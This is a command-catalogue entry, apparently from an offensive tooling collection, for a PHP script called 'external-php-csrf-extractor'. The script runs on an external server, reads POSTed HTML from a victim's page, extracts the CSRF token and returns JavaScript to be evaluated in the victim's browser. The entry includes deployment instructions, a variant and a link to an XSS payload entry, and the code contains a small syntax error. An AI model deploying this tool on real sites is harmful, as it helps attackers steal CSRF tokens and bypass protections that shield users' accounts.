---
data: >-
  <? header("Access-Control-Allow-Origin: *"); $html =
  file_get_contents('php://input'); $doc = DOMDocument::loadHTML($html); $xpath
  = new DOMXPath($doc); $query = "//meta[@name='csrf-token']"; $entries =
  $xpath->query($query); $csrf = ""; foreach ($entries as $entry) { $csrf =
  $entry->getAttribute('content'); break; } $request = "alert('CSRF Token: " .
  $csrf . "');"); echo $request; ?>
tags:
  - csrf
  - extraction
  - php
type: command
executor: php
platforms:
  - Web
id: e6d5cd4b-7482-4871-aadd-c4f72bc62793
created_at: '2025-12-14T17:30:18.177Z'
updated_at: '2025-12-14T17:30:18.177Z'
verified: false
validated: true
submitted: true
---
# external-php-csrf-extractor

## Command

```php
<? header("Access-Control-Allow-Origin: *"); $html = file_get_contents('php://input'); $doc = DOMDocument::loadHTML($html); $xpath = new DOMXPath($doc); $query = "//meta[@name='csrf-token']"; $entries = $xpath->query($query); $csrf = ""; foreach ($entries as $entry) { $csrf = $entry->getAttribute('content'); break; } $request = "alert('CSRF Token: " . $csrf . "');"); echo $request; ?>
```

## Description

This PHP script runs on an external server to receive POSTed HTML, parse it using DOMDocument and XPath to extract the CSRF token from the meta tag, and return JavaScript code to alert the token for evaluation in the victim's browser.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Access-Control-Allow-Origin | Allows cross-origin requests ("*") | Yes |
| php://input | Reads POST body as HTML | Yes |
| //meta[@name='csrf-token'] | XPath query for token | Yes |

## Examples

### Basic Usage

Deploy as index.php on server:

```php
<?php // full script above ?>
```

### Advanced Usage

Modify to return different JS:

```php
$request = "console.log('Token: " . $csrf . "');";
```

## Expected Output

Processes HTML, extracts token (e.g., 'abc123'), outputs: alert('CSRF Token: abc123');

## Related

- [[commands/shopify-xss-payload-injection]]
